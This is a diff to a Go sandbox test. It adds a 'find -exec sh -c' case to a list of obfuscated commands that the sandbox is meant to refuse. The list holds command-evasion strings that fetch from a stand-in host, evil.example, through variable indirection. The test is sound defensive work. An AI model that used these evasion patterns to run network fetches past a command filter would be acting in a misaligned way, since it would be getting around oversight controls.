@@ -56,6 +56,7 @@ func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
 		`sh -c -- 'c=wget; $c https://evil.example/x'`,
 		`sh -c -x 'c=wget; $c https://evil.example/x'`,
 		`sh -xc -- 'c=wget; $c https://evil.example/x'`,
+		`find . -exec sh -c 'c=wget; $c https://evil.example/x' \;`,
 		`c=curl; $c https://evil.example/x`,
 		`c=git; $c push origin main`,
 		`echo {a,b}`,
